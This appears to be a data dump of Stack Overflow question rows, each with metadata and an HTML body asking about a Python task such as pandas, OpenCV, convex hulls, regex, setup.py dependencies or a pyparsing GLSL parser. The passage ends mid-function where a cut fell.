<p>I more or less know how to implement it myself, the question is what is the simplest way to do it in python with scikit-learn. Ideally it should be same (or easily adaptable) with several learning method(a lot of methods based on loss function and gradient), is where possible to make some wrapper for learning methods which works this way? </p>

<p><strong>update</strong>: looking at gradient_boosting.py - there is internal abstract class LossFunction with ability to calculate loss and gradient, looks perspective. Looks like there is no common solution.</p>
"
39705161,470433.0,2016-09-26 14:10:41+00:00,2,How to get the coordinates of the rotated bounding box,"<p>With python OpenCV I rotate an image that already has bounding boxes. I do this using the <code>getRotationMatrix2D</code> function. How can I use this to calculate the new coordinates of the bounding box?</p>

<p>Here is my sourcecode:</p>

<pre><code>import cv2
import numpy as np
import matplotlib.pyplot as plt
from PIL import Image

def rotateImage(image, angle, bboxes):
    center=tuple(np.array(image.shape[0:2])/2)
    rot_mat = cv2.getRotationMatrix2D(center,angle,1.0)
    return cv2.warpAffine(image, rot_mat, image.shape[0:2],flags=cv2.INTER_LINEAR)


img = cv2.imread('input.jpg')
img = img[:,:,::-1]

img_new = rotateImage(img, 5.0, [(0,0,50,50)])

plt.subplot(121),plt.imshow(img),plt.title('Input')
plt.subplot(122),plt.imshow(img_new),plt.title('Output')
plt.show()
</code></pre>
"
40066439,6820344.0,2016-10-16 03:11:34+00:00,2,How to calculate frequency of elements for pairwise comparisons of lists in Python?,"<p>I have the the sample stored in the following list</p>

<pre><code> sample = [AAAA,CGCG,TTTT,AT-T,CATC]
</code></pre>

<p>.. To illustrate the problem, I have denoted them as ""Sets"" below</p>

<pre><code>Set1 AAAA
Set2 CGCG
Set3 TTTT
Set4 AT-T
Set5 CATC
</code></pre>

<ol>
<li>Eliminate all Sets where each every element in the set is identical to itself.</li>
</ol>

<p>Output:</p>

<pre><code> Set2 CGCG
 Set4 AT-T
 Set5 CATC
</code></pre>

<ol start=""2"">
<li><p>Perform pairwise comparison between the sets. (Set2 v Set4, Set 2v Set5, Set4 v Set5)</p></li>
<li><p>Each pairwise comparison can have only two types of combinations, if not then those pairwise comparisons are eliminated. eg,</p>

<pre><code>Set2    Set5
C       C
G       A
C       T 
G       C
</code></pre></li>
</ol>

<p>Here, there are more than two types of pairs (CC), (GA), (CT) and (GC). So this pairwise comparison cannot occur. </p>

<p>Every comparison can have only 2 combinations out of (AA, GG,CC,TT, AT,TA,AC,CA,AG,GA,GC,CG,GT,TG,CT,TC) ... basically all possible combinations of ACGT where order matters. </p>

<p>In the given example, more than 2 such combinations are found. </p>

<p>Hence, Set2 and Set4; Set4 and Set5 cannot be considered.Thus the only pairs, that remain are:</p>

<pre><code>Output
Set2 CGCG
Set4 AT-T
</code></pre>

<ol start=""4"">
<li><p>In this pairwise comparison, remove any the element with ""-"" and its corresponding element in the other pair</p>

<pre><code>Output    
Set2 CGG
Set4 ATT
</code></pre></li>
<li><p>Calculate frequency of elements in Set2 and Set4. Calculate frequency of occurrence of types of pairs across the Sets (CA and GT pairs)</p>

<pre><code>Output
Set2 (C = 1/3, G = 2/3)
Set4 (A = 1/3, T = 2/3)
Pairs (CA = 1/3, GT = 2/3)
</code></pre></li>
<li><p>Calculate float(a) = (Pairs) - (Set2) * (Set4) for corresponding element (any one pair is sufficient)</p>

<pre><code>eg. For CA pairs, float (a) = (freq of CA pairs) - (freq of C) * (freq of A)
</code></pre></li>
</ol>

<p>NOTE: If the pair is AAAC and CCCA, the freq of C would it be 1/4, i.e. it is the frequency of the base over one of the pairs</p>

<ol start=""7"">
<li><p>Calculate </p>

<pre><code>float (b) = float(a)/ (freq of C in CGG) * (freq G in CGG) * (freq A in ATT) * (ATT==&gt; freq of T in ATT)
</code></pre></li>
<li><p>Repeat this for all pairwise comparisons</p></li>
</ol>

<p>eg. </p>

<pre><code>Set2 CGCG
Set4 AT-T
Set6 GCGC
</code></pre>

<p>Set2 v Set4, Set2 v Set6, Set4 v Set6</p>

<p>My half-baked code till now:
** I would prefer if all codes suggested would be in standard for-loop format and not comprehensions **</p>

<pre><code>#Step 1
for i in sample: 
    for j in range(i):
        if j = j+1    #This needs to be corrected to if all elements in i identical to each other i.e. if all ""j's"" are the same
                        del i 
    #insert line of code where sample1 = new sample with deletions as above

#Step 2
    for i,i+1 in enumerate(sample):
    #Step 3
    for j in range(i):
        for k in range (i+1):
        #insert line of code to say only two types of pairs can be included, if yes continue else skip
            #Step 4
            if j = ""-"" or k = ""-"":
                #Delete j/k and the corresponding element in the other pair
                #Step 5
                count_dict = {}
                    square_dict = {}
                for base in list(i):
                    if base in count_dict:
                            count_dict[base] += 1
                    else:
                            count_dict[base] = 1
                    for allele in count_dict:
                    freq = (count_dict[allele] / len(i)) #frequencies of individual alleles
                    #Calculate frequency of pairs 
                #Step 6
                No code yet
</code></pre>
"
40065971,6247850.0,2016-10-16 01:39:21+00:00,2,Making subplots based on specific column in Pandas,"<p>I have a pandas data frame that contains polynomial approximations of various functions at given points, with variable degrees to the polynomial approximation.  It is arranged so that the first column is the function name, the second is the x value, then columns 2-5 are the approximations with a polynomial of the corresponding degree.  I would like to make 1 plot for each function showing the convergence of the approximations to that function.  I know one way to do it is to break the data frame into separate data frames based on the first column name, but wanted to know if there was a more elegant way to do it.</p>

<p>Edit for clarification:
So in the data frame, there are two unrelated functions, say a and b.  The second column contains the x values, then third and fourth are functions of x.  So it might look like     </p>

<pre><code>   fnctn  x  y1  y2
0     a  1   2   3
1     a  2   3   2
2     a  3   4   3
3     a  4   3   4
4     a  5   2   3
5     b  1   1   2
6     b  2   4   6
7     b  3   9   12
8     b  4   16  20
9     b  5   25  30
</code></pre>

<p>I would want a plot of y1 and y2 where the first column is <em>a</em> on one plot, and on another plot y1 and y2 where the first column is <em>b</em></p>
"
39687713,5231877.0,2016-09-25 14:06:09+00:00,2,What the difference between dict_proxy in python2 and mappingproxy in python3?,"<p>I notice when I create class in python2 it stores attributes in <code>dict_proxy</code> object:  </p>

<pre><code>&gt;&gt;&gt; class A(object):
...     pass
&gt;&gt;&gt; A.__dict__
dict_proxy({....})
</code></pre>

<p>But in python3 <code>__dict__</code> returns <code>mappingproxy</code>:  </p>

<pre><code>&gt;&gt;&gt; class A(object):
...     pass
&gt;&gt;&gt; A.__dict__
mappingproxy({....})
</code></pre>

<p>Is there any difference between two of them?</p>
"
40065762,2800939.0,2016-10-16 00:53:29+00:00,2,Pandas plot mean values from corresponding unique id values,"<p>This is my csv file. I want to find the mean cost for each unique ids. </p>

<p>so for example: id 1, mean cost should be 20.</p>

<pre><code>id,cost
1,10 
1,20
1,30
2,40
2,50
</code></pre>

<p>I got the output right with:</p>

<pre><code>df.groupby(['id'])['cost'].mean()
id
1    20
2    45
Name: cost, dtype: int64
</code></pre>

<p>But i dont know how to plot such that x-axis is the id (1,2) and y axis as the mean values (20,45). </p>

<p>The below code made the mean to be the x-axis (should be on y-axis) while the y-axis is only until 1 (should be 2 and should be the x-axis). </p>

<pre><code>df.groupby(['id'])['cost'].mean().hist()
</code></pre>

<p><a href=""https://i.stack.imgur.com/tpP7j.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/tpP7j.png"" alt=""enter image description here""></a></p>
"
39705022,5355800.0,2016-09-26 14:03:33+00:00,2,Looping over pandas data frame applying formula to each value,"<p>I have the following pandas data frame:</p>

<pre><code>            PC1     PC2     PC3     PC4     PC5     PC6     PC7
ind                                                                       
NA06984 -0.0082 -0.0594 -0.0148 -0.0569 -0.1128 -0.0276 -0.0217 
NA06986 -0.0131 -0.0659 -0.0426  0.0654  0.0473  0.0603 -0.0454  
NA06989 -0.0073 -0.0551 -0.0457  0.0971 -0.0051 -0.0123  0.0035  
NA06994 -0.0051 -0.0599 -0.0239  0.0930  0.0765  0.0321  0.0392  
NA07000 -0.0046 -0.0362  0.0006 -0.0639 -0.0197 -0.0132  0.0631  
NA07037 -0.0132 -0.0600 -0.0252 -0.0381 -0.0091  0.0005  0.0235  
NA07048 -0.0128 -0.0653 -0.0234 -0.0417  0.0233  0.1034  0.0180  
NA07051 -0.0028 -0.0591 -0.0117 -0.0791 -0.0387  0.0102 -0.0840  
NA07056 -0.0121 -0.0389  0.0113 -0.0754  0.0226 -0.0304 -0.0490  
NA07347 -0.0192 -0.0441 -0.0588  0.1099 -0.0414  0.0505  0.0295
NA07357 -0.0100 -0.0360 -0.0268 -0.0621 -0.0737 -0.0090  0.0379
</code></pre>

<p>and I would like to standardize the distributions of each column, i.e. applying the formula </p>

<p>column_i[row_j] - column_i.mean()) / column_i.std() </p>

<p>for every value in every column, and substitute the original data frame with these values.</p>

<p>So far I have come up with </p>

<pre><code>for index, row in evec_pandas.iterrows():
    new_row = None
    evec_pandas.loc[index,'PC1'] = (row['PC1'] - evec_pandas['PC1'].mean()) / evec_pandas['PC1'].std()

 print evec_pandas
</code></pre>

<p>but the results are</p>

<pre><code>              PC1     PC2     PC3     PC4     PC5     PC6     PC7
ind                                                                         
NA06984  0.343471 -0.0594 -0.0148 -0.0569 -0.1128 -0.0276 -0.0217  
NA06986 -0.330077 -0.0659 -0.0426  0.0654  0.0473  0.0603 -0.0454 
NA06989 -0.003975 -0.0551 -0.0457  0.0971 -0.0051 -0.0123  0.0035  
NA06994  0.008607 -0.0599 -0.0239  0.0930  0.0765  0.0321  0.0392  
NA07000  0.003659 -0.0362  0.0006 -0.0639 -0.0197 -0.0132  0.0631  
NA07037 -0.058300 -0.0600 -0.0252 -0.0381 -0.0091  0.0005  0.0235 
NA07048 -0.028319 -0.0653 -0.0234 -0.0417  0.0233  0.1034  0.0180  
NA07051  0.046818 -0.0591 -0.0117 -0.0791 -0.0387  0.0102 -0.0840  
NA07056 -0.043817 -0.0389  0.0113 -0.0754  0.0226 -0.0304 -0.0490   
NA07347 -0.071195 -0.0441 -0.0588  0.1099 -0.0414  0.0505  0.0295 
NA07357  0.019495 -0.0360 -0.0268 -0.0621 -0.0737 -0.0090  0.0379  
</code></pre>

<p>The first value is correct (0.343471), but the rest of the values in the PC1 column are not, and of course the rest of columns have no changes. If I use:</p>

<pre><code>for index, row in evec_pandas.iterrows():
    new_row = None
    new_row = (row['PC1'] - evec_pandas['PC1'].mean()) / evec_pandas['PC1'].std()
    print new_row
</code></pre>

<p>I do obtain the PC1 column as it should be, but as an independent object, not inside the data frame:</p>

<pre><code>0.343471311655
-0.673732188246
0.530304607555
0.987008219756
1.09080449526
-0.694491443346
-0.611454422946
1.46447108706
-0.466139637246
-1.94004674935
-0.0301952801455
</code></pre>

<p>So I need to substitute PC1 with these values, and then do the same for each column; I had thought of something like</p>

<pre><code>for index, column in evec_pandas.iteritems():
    for index, row in evec_pandas.iterrows():
        new_row = None
        evec_pandas.loc[index,column] = (row[column] - evec_pandas[column].mean()) / evec_pandas[column].std()
</code></pre>

<p>But I understand it won't work like this. Any ideas?</p>

<p>The desired output would be:</p>

<pre><code>                PC1        PC2          PC3        PC4        PC5        PC6         PC7
NA06984  0.34347131 -0.5760881  0.439607045 -0.6710009 -1.8594019 -1.0130591 -0.50633142
NA06986 -0.67373219 -1.1365003 -0.929352573  0.9013689  1.0906816  1.0794999 -1.02745500
NA06989  0.53030461 -0.2053539 -1.082006343  1.3089251  0.1251327 -0.6488253  0.04777466
NA06994  0.98700822 -0.6191967 -0.008505635  1.2562128  1.6287356  0.4081670  0.83275827
NA07000  1.09080450  1.4241525  1.197951582 -0.7609975 -0.1438943 -0.6702508  1.35827952
NA07037 -0.69449144 -0.6278185 -0.072521733 -0.4292956  0.0514267 -0.3441068  0.48754139
NA07048 -0.61145442 -1.0847700  0.016115941 -0.4755796  0.6484455  2.1055441  0.36660554
NA07051  1.46447109 -0.5502229  0.592260816 -0.9564188 -0.4939979 -0.1131873 -1.87620479
NA07056 -0.46613964  1.1913658  1.724853306 -0.9088491  0.6355469 -1.0797163 -1.10661301
NA07347 -1.94004675  0.7430361 -1.727091631  1.4734904 -0.5437494  0.8461998  0.61947141
NA07357 -0.03019528  1.4413959 -0.151310775 -0.7378555 -1.1389255 -0.5702651  0.80417343
</code></pre>
"
40065641,6107994.0,2016-10-16 00:33:21+00:00,2,"Python Pandas Concat ""WHERE"" a Condition is met","<p>How can I ""concat"" a specific column from many Python Pandas dataframes, WHERE another column in each of the many dataframes meets a certain condition (colloquially termed condition ""X"" here).</p>

<p>In SQL this would be simple using JOIN clause with WHERE df2.Col2 = ""X"" and df3.Col2 = ""X"" and df4.col2 = ""X""... etc (which can be run dynamically).</p>

<p>In my case, I want to create a big dataframe with all the ""Col1""s from each of the many dataframes, but only include the Col1 row values WHERE the corresponding Col2 row value is greater than ""0.8"". When this condition isn't met, the Col1 value should be ""NaN"".</p>

<p>Any ideas would be most helpful! Thanks in advance!</p>
"
40056998,3170199.0,2016-10-15 08:50:32+00:00,2,string is a JSON object or JSON array in Python?,"<p>I am reading JSON file line by line. Few lines contain JSON objects while other contains JSON array. I am using <code>json.loads(line)</code> function to get JSON from each line. </p>

<pre><code>def read_json_file(file_name):
    json_file = []
    with open(file_name) as f:
        for line in f:
            json_file.append((line))

    json_array = []
    for obj in json_file:
        try:
            json_array.append(json.loads(obj))
        except ValueError:
            print(""data was not valid JSON"")

    return json_array
</code></pre>

<p>Is there any way that I can find out that object I am reading is JSON Object or JSON array? I want to save all the result in json_array.</p>

<p>I will be thankful to you if anyone can help me.</p>
"
40065378,7025089.0,2016-10-15 23:45:44+00:00,2,Python using custom color in plot,"<p>I'm having a problem that (I think) should have a fairly simple solution. I'm still a relative novice in Python, so apologies if I'm doing something obviously wrong. I'm just trying to create a simple plot with multiple lines, where each line is colored by its own specific, user-defined color. When I run the following code as a test for one of the colors it ends up giving me a blank plot. What am I missing here? Thank you very much!</p>

<pre><code>import numpy as np
import matplotlib.pyplot as plt
from colour import Color 

dbz53 = Color('#DD3044')

*a bunch of arrays of data, two of which are called x and mpt1* 

fig, ax = plt.subplots()
ax.plot(x, mpt1, color='dbz53', label='53 dBz')
ax.set_yscale('log')

ax.set_xlabel('Diameter (mm)')
ax.set_ylabel('$N(D) (m^-4)$')
ax.set_title('N(D) vs. D')
#ax.legend(loc='upper right')

plt.show()
</code></pre>
"
39688985,6878418.0,2016-09-25 16:08:13+00:00,2,Set bias in CNN,"<p>I have two massive numpy arrays of weights and biases for a CNN. I can set weights for each layer (using <code>set_weights</code>) but I don't see a way to set the bias for each layer. How do I do this?</p>
"
39689099,6853930.0,2016-09-25 16:20:52+00:00,2,Can someone explain this expression: a[len(a):] = [x] equivalent to list.append(x),"<p>I'm at the very beginning of learning Python 3. Getting to know the language basics. There is a method to the list data type:</p>

<pre><code>list.append(x)
</code></pre>

<p>and in the tutorial it is said to be equivalent to this expression:</p>

<pre><code>a[len(a):] = [x]
</code></pre>

<p>Can someone please explain this expression? I can't grasp the <strong>len(a):</strong> part. It's a slice right? From the last item to the last? Can't make sense of it.</p>

<p>I'm aware this is very newbie, sorry. I'm determined to learn Python for Blender scripting and the Game Engine, and want to understand well all the constructs.</p>
"
40056061,5653451.0,2016-10-15 07:00:56+00:00,2,Maximum distance between points in a convex hull,"<p>I am solving a problem in which I need to find the maximum distance between two points on a plane (2D) .So there is an O(n^2) approach in which I calculate distance between every point in the graph . I also implemented a convex hull algorithm now my approach is I compute convex hull in O(nlogn) and then use the O(n^2) algorithm to compute maximum distance between points in the convex hull. Is there a better approach than this to compute the max distance  in convex hull</p>

<p>Here are my algorithm :</p>

<blockquote>
  <p>O(n^2)</p>
</blockquote>

<pre><code> def d(l1,l2):
    return ((l2[0]-l1[0])**2+(l2[1]-l1[1])**2)
def find_max_dist(L):
    max_dist = d(L[0], L[1])
    for i in range(0, len(L)-1):
        for j in range(i+1, len(L)):
            max_dist = max(d(L[i], L[j]), max_dist)
    return max_dist
</code></pre>

<blockquote>
  <p>convex hull</p>
</blockquote>

<pre><code>def convex_hull(points):
    """"""Computes the convex hull of a set of 2D points.

       Input: an iterable sequence of (x, y) pairs representing the points.
       Output: a list of vertices of the convex hull in counter-clockwise order,
       starting from the vertex with the lexicographically smallest coordinates.
       Implements Andrew's monotone chain algorithm. O(n log n) complexity.
""""""

      # Sort the points lexicographically (tuples are compared lexicographically).
      # Remove duplicates to detect the case we have just one unique point.
        points = sorted(set(points))

      # Boring case: no points or a single point, possibly repeated multiple times.
    if len(points) &lt;= 1:
        return points

    # 2D cross product of OA and OB vectors, i.e. z-component of their 3D cross product.
    # Returns a positive value, if OAB makes a counter-clockwise turn,
    # negative for clockwise turn, and zero if the points are collinear.
    def cross(o, a, b):
        return (a[0] - o[0]) * (b[1] - o[1]) - (a[1] - o[1]) * (b[0] - o[0])

    # Build lower hull
    lower = []
    for p in points:
        while len(lower) &gt;= 2 and cross(lower[-2], lower[-1], p) &lt;= 0:
            lower.pop()
        lower.append(p)

    # Build upper hull
    upper = []
    for p in reversed(points):
        while len(upper) &gt;= 2 and cross(upper[-2], upper[-1], p) &lt;= 0:
            upper.pop()
        upper.append(p)

    # Concatenation of the lower and upper hulls gives the convex hull.
    # Last point of each list is omitted because it is repeated at the beginning of the other list.
    return lower[:-1] + upper[:-1]
</code></pre>

<blockquote>
  <p>overall algorithm</p>
</blockquote>

<pre><code> l=[]
 for i in xrange(int(raw_input())):   # takes input denoting number  of points in the plane
     n=tuple(int(i) for i in raw_input().split())  #takes each point and makes a tuple
     l.append(n)                                # appends to n

 if len(l)&gt;=10:
        print find_max_dist(convex_hull(l))
 else:
        print find_max_dist(l)
</code></pre>

<p>Now how do I improve the running time of my approach and is there a better way to compute this ?</p>
"
40065321,5483098.0,2016-10-15 23:36:58+00:00,2,How to include git dependencies in setup.py for pip installation,"<p>I need to include Python packages available via public Github repositories along with my Python (2.7) package. My package should be installable via <code>pip</code> using <code>setup.py</code>.</p>

<p>So far, this could be done using <code>dependency_links</code> in the <code>setup.py</code> file:</p>

<pre class=""lang-py prettyprint-override""><code>setuptools.setup(
   name=""my_package"",
   version=""1.0"",
   install_requires=[
       ""other_package==1.2""
   ],
   dependency_links=[
      ""https://github.com/user/other_package/tarball/master#egg=other_package-1.2""
   ]    
)
</code></pre>

<p>This still works when the package gets installed with the <code>--process-dependency-links</code> flag, but the <code>dependency_links</code> functionality seems to be deprecated, since:</p>

<pre class=""lang-none prettyprint-override""><code>pip install git+https://github.com/user/my_package@master#egg=my_package-1.0 --process-dependency-links
</code></pre>

<p>gives me the following warning:</p>

<pre class=""lang-none prettyprint-override""><code>DEPRECATION: Dependency Links processing has been deprecated and will be removed in a future release.
</code></pre>

<p>Is there an alternative way to include <code>git</code> dependencies in the <code>setup.py</code> file with support for pip installation?</p>

<p>Edit (10/17/2016) to clarify my use case:</p>

<p>Let's say I find a bug in <code>other_package</code>. I fork the respective repo on Github, fix the bug and make a pull request. My pull request doesn't get immediately accepted (or never will be because the package is no longer actively maintained). I would like to distribute <code>my_package</code> together with my fork of <code>other_package</code> and want users to be able to pip install <code>my_package</code> without any further knowledge about the details of this requirement and without having to provide any additional flags upon installation. Users of <code>my_package</code> should further be able to include <code>my_package</code> as a requirement in their own custom packages.</p>

<p>How can this be achieved bearing compatibly with different modes of installation (wheels, eggs, develop, ...) in mind?</p>
"
40065108,2463048.0,2016-10-15 23:00:58+00:00,2,Regex taking too long in python,"<p>I have used regex101 to test my regex and it works fine.What i am trying to is to detect these patterns</p>

<ol>
<li>section 1.2 random 2</li>
<li>1.2 random 2</li>
<li>1.2. random 2</li>
<li>random 2</li>
<li>random 2.</li>
</ol>

<p>But its just random it shouldn't match if the string is like that</p>

<ol>
<li>random</li>
</ol>

<p>My regex is this.</p>

<pre><code>  m = re.match(r""^(((section)\s*|(\d+\.)|\d+|(\d+\.\d+)|[a-zA-z\s]|[a-zA-z\.\s])+((\d+\.$)|\d+$|(\d+\.\d+$)))"",""random random random random random"",flags = re.I)
</code></pre>

<p>If i give in a long string it gets stuck.Any ideas?</p>
"
39689555,6753275.0,2016-09-25 17:07:28+00:00,2,Simple image rotation with Python and DOM using RapydScript,"<p>I have this code write in Python and works fine with Brython. 
This code rotate image in this case a cog. 
How Can I change it, and what change to work with RapydScript? I am new at programming so please have patience :D</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;

&lt;!-- load Brython --&gt;
&lt;script src=""http://brython.info/src/brython_dist.js""&gt;&lt;/script&gt;


&lt;!-- the main script; after loading, Brython will run all 'text/python3' scripts --&gt;
&lt;script type='text/python'&gt;
from browser import window, timer, document, html
import time

&lt;!-- I know that here, I must use this t0 = Date.now() --&gt;

t0 = time.time()


def user_agent():
   """""" Helper function for determining the user agent """"""
   if window.navigator.userAgent.find('Chrome'):
       return 'chrome'
   elif window.navigator.userAgent.find('Firefox'):
       return 'firefox'
   elif window.navigator.userAgent.find('MSIE'):
       return 'msie'
   elif window.navigator.userAgent.find('Opera'):
       return 'opera'

# Dict Mapping UserAgents to Transform Property names
rotate_property = {
   'chrome':'WebkitTransform',
   'firefox':'MozTransform',
   'msie':'msTransform',
   'opera':'OTransform'
}

degrees = 0
def animation_step(elem_id):
   """""" Called every 30msec to increase the rotatation of the element. """"""
   global degrees, tm

   # Get the right property name according to the useragent
   agent = user_agent()
   prop = rotate_property.get(agent,'transform')

   # Get the element by id
   el = document[elem_id]

   # Set the rotation of the element
   setattr(el.style, prop, ""rotate(""+str(degrees)+""deg)"")
   document['status'].innerHTML = ""rotate(""+str(degrees)+"" deg)""


   # Increase the rotation
   degrees += 1
   if degrees &gt; 360:
       # Stops the animation after 360 steps
       timer.clear_interval(tm)
       degrees = 0

# Start the animation
tm = timer.set_interval(lambda id='img1':animation_step(id),30)

document['status3'].innerHTML = ""Time of execution python code(""+str(time.time()-t0)+"" ms)""

&lt;!-- I know that here i must use this: ""Time of execution python code"", Date.now()-t0, ""ms"") --&gt;
&lt;/script&gt;

&lt;/head&gt;

&lt;!-- After the page has finished loading, run bootstrap Brython by running
     the Brython function. The argument '1' tells Brython to print error
     messages to the console. --&gt;
&lt;body onload='brython(1)'&gt;

&lt;img id=""img1"" src=""cog1.png"" alt=""cog1""&gt;
&lt;script&gt;animation_step(""img1"",30);&lt;/script&gt;
&lt;h2 style=""width:200px;"" id=""status""&gt;&lt;/h2&gt;
&lt;h2 style=""width:800px;"" id=""status3""&gt;&lt;/h2&gt;


&lt;/body&gt;  
&lt;/html&gt;
</code></pre>
"
39702882,3809375.0,2016-09-26 12:30:15+00:00,2,glsl parser using pyparsing giving AttributeErrors,"<p>I'm trying to update this <a href=""https://github.com/rougier/glsl-parser"" rel=""nofollow"">glsl-parser</a> which uses an old pyparsing version and python2.x to python3.x &amp; the newest pyparsing version (2.1.9 atm). </p>

<p>I don't know which pyparsing version was using the original source code but it must be quite old because is still using <code>keepOriginalText</code> helper method, after reading pyparsing <a href=""http://pyparsing.wikispaces.com/News"" rel=""nofollow"">news</a> I've seen this comment <code>Removed keepOriginalText helper method, which was deprecated ages ago. Superceded by originalTextFor.</code></p>

<p>Anyway, here's the first attempt of the port using python3.5.1 &amp; pyparsing==2.1.9:</p>

<pre><code># -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright (c) 2014, Nicolas P. Rougier
# Distributed under the (new) BSD License. See LICENSE.txt for more info.
# -----------------------------------------------------------------------------
import pyparsing

keywords = (""attribute const uniform varying break continue do for while""
            ""if else""
            ""in out inout""
            ""float int void bool true false""
            ""lowp mediump highp precision invariant""
            ""discard return""
            ""mat2 mat3 mat4""
            ""vec2 vec3 vec4 ivec2 ivec3 ivec4 bvec2 bvec3 bvec4 sampler2D samplerCube""
            ""struct"")
reserved = (""asm""
            ""class union enum typedef template this packed""
            ""goto switch default""
            ""inline noinline volatile public static extern external""
            ""interface flat long short double half fixed unsigned superp""
            ""input output""
            ""hvec2 hvec3 hvec4 dvec2 dvec3 dvec4 fvec2 fvec3 fvec4 sampler1D sampler3D""
            ""sampler1DShadow sampler2DShadow""
            ""sampler2DRect sampler3DRect sampler2DRectShadow""
            ""sizeof cast""
            ""namespace using"")
precision = ""lowp mediump high""
storage = ""const uniform attribute varying""


# Tokens
# ----------------------------------
LPAREN = pyparsing.Literal(""("").suppress()
RPAREN = pyparsing.Literal("")"").suppress()
LBRACK = pyparsing.Literal(""["").suppress()
RBRACK = pyparsing.Literal(""]"").suppress()
LBRACE = pyparsing.Literal(""{"").suppress()
RBRACE = pyparsing.Literal(""}"").suppress()
IDENTIFIER = pyparsing.Word(pyparsing.alphas + '_', pyparsing.alphanums + '_')
TYPE = pyparsing.Word(pyparsing.alphas + '_', pyparsing.alphanums + ""_"")
END = pyparsing.Literal("";"").suppress()
INT = pyparsing.Word(pyparsing.nums)
FLOAT = pyparsing.Regex(
    '[+-]?(((\d+\.\d*)|(\d*\.\d+))([eE][-+]?\d+)?)|(\d*[eE][+-]?\d+)')
STORAGE = pyparsing.Regex('|'.join(storage.split(' ')))
PRECISION = pyparsing.Regex('|'.join(precision.split(' ')))
STRUCT = pyparsing.Literal(""struct"").suppress()


# ------------------------
def get_prototypes(code):
    """"""
    Get all function declarations

    Code example
    ------------

    mediump vec3 function_1(vec4);
    vec3 function_2(float a, float b);
    """"""

    PARAMETER = pyparsing.Group(pyparsing.Optional(PRECISION).setResultsName(""precision"") +
                                TYPE.setResultsName(""type"") +
                                pyparsing.Optional(IDENTIFIER).setResultsName(""name""))
    PARAMETERS = pyparsing.delimitedList(PARAMETER).setResultsName(
        ""arg"", listAllMatches=True)
    PROTOTYPE = (pyparsing.Optional(PRECISION).setResultsName(""precision"") +
                 TYPE.setResultsName(""type"") +
                 IDENTIFIER.setResultsName(""name"") +
                 LPAREN + pyparsing.Optional(PARAMETERS).setResultsName(""args"") + RPAREN +
                 END)
    PROTOTYPE.ignore(pyparsing.cStyleComment)

    for (token, start, end) in PROTOTYPE.scanString(code):
        print(token.precision, token.type, token.name, '(',)
        for arg in token.args:
            print(arg.precision, arg.type, arg.name, ',',)
        print(')')


# ------------------------
def get_functions(code):
    """"""
    Get all function definitions

    Code example
    ------------

    mediump vec3 compute_normal(vec4);
    """"""

    PARAMETER = pyparsing.Group(pyparsing.Optional(PRECISION).setResultsName(""precision"") +
                                TYPE.setResultsName(""type"") +
                                pyparsing.Optional(IDENTIFIER).setResultsName(""name""))
    PARAMETERS = pyparsing.delimitedList(PARAMETER).setResultsName(
        ""arg"", listAllMatches=True)
    FUNCTION = (pyparsing.Optional(PRECISION).setResultsName(""precision"") +
                TYPE.setResultsName(""type"") +
                IDENTIFIER.setResultsName(""name"") +
                LPAREN + pyparsing.Optional(PARAMETERS).setResultsName(""args"") + RPAREN +
                pyparsing.nestedExpr(""{"", ""}"").setParseAction(pyparsing.originalTextFor).setResultsName(""code""))
    FUNCTION.ignore(pyparsing.cStyleComment)

    for (token, start, end) in FUNCTION.scanString(code):
        print(token.precision, token.type, token.name, '(',)
        for arg in token.args:
            print(arg.precision, arg.type, arg.name, ',',)
        print(') { ... }')

        # print token.code
        # print code[start:end]


# ------------------------
def get_version(code):
    """"""
    Get shader version (if specified)

    Code example
    ------------

    #version 120
    """"""

    VERSION = (
        pyparsing.Literal(""#"") + pyparsing.Keyword(""version"")).suppress() + INT
    for (token, start, end) in VERSION.scanString(code):
        version = token[0]
        # print code[start:end]
    return version

# ------------------------


def get_declarations(code):
    """"""
    Get all declarations prefixed with a storage qualifier.

    Code example
    ------------

    uniform lowp vec4 fg_color = vec4(1),
                      bg_color = vec4(vec3(0),1);
    """"""

    # Callable expression
    EXPRESSION = pyparsing.Forward()
    ARG = pyparsing.Group(EXPRESSION) | IDENTIFIER | FLOAT | INT
    ARGS = pyparsing.delimitedList(ARG)
    EXPRESSION &lt;&lt; IDENTIFIER + \
        pyparsing.Group(LPAREN + pyparsing.Optional(ARGS) + RPAREN)

    # Value
    VALUE = (EXPRESSION | pyparsing.Word(pyparsing.alphanums + ""_()+-/*"")
             ).setParseAction(pyparsing.originalTextFor)

    # Single declaration
    VARIABLE = (IDENTIFIER.setResultsName(""name"") +
                pyparsing.Optional(LBRACK +
                                   (INT | IDENTIFIER).setResultsName(""size"")
                                   + RBRACK) +
                pyparsing.Optional(pyparsing.Literal(""="").suppress() + VALUE.setResultsName(""value"")))

    # Several declarations at once
    DECLARATION = (STORAGE.setResultsName(""storage"") +
                   pyparsing.Optional(PRECISION).setResultsName(""precision"") +
                   TYPE.setResultsName(""type"") +
                   pyparsing.delimitedList(VARIABLE.setResultsName(""variable"", listAllMatches=True)) +
                   END)
    DECLARATION.ignore(pyparsing.cStyleComment)

    for (tokens, start, end) in DECLARATION.scanString(code):
        for token in tokens.variable:
            print(tokens.storage, tokens.precision, tokens.type,)
            print(token.name, token.size)


# ------------------------
def get_definitions(code):
    """"""
    Get all structure definitions and associated declarations.

    Code example
    ------------

    uniform struct Light {
        vec4 position;
        vec3 color;
    } light0, light1;
    """"""

    # Single declaration
    DECLARATION = pyparsing.Group(IDENTIFIER.setResultsName(""name"") +
                                  pyparsing.Optional(LBRACK +
                                                     (INT | IDENTIFIER).setResultsName(""size"") +
                                                     RBRACK))
    # Several declarations at once
    DECLARATIONS = (pyparsing.Optional(PRECISION) +
                    TYPE +
                    pyparsing.delimitedList(DECLARATION) +
                    END)

    # Definition + declarations
    DEFINITION = (STRUCT +
                  IDENTIFIER.setResultsName(""name"") +
                  LBRACE + pyparsing.OneOrMore(DECLARATIONS).setResultsName('content') + RBRACE +
                  pyparsing.Optional(pyparsing.delimitedList(DECLARATION.setResultsName(""declarations"", listAllMatches=True))) +
                  END)
    DEFINITION.ignore(pyparsing.cStyleComment)

    for (tokens, start, end) in DEFINITION.scanString(code):
        for token in tokens.declarations:
            print(tokens.name, token.name)
            # print tokens.content


# ----------------
def resolve(code):
    """"""
    Expand const and preprocessor definitions in order to get constant values.

    Return the transformed code
    """"""

    constants = {}

    DEFINITION = (pyparsing.Literal(""#"") + pyparsing.Literal(""define"") +
                  IDENTIFIER.setResultsName(""name"") +
